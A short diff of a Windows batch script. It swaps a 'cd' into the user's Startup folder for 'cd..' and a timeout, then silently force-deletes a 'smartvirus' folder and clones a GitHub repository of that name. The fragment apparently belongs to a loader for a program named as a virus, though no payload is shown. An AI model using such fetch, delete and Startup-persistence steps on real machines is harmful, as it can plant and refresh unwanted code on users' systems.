@@ -1,4 +1,5 @@
-cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
+cd..
+timeout 2
 rmdir /s /q smartvirus
 git clone https://github.com/mattistjnn/smartvirus
 cd smartvirus
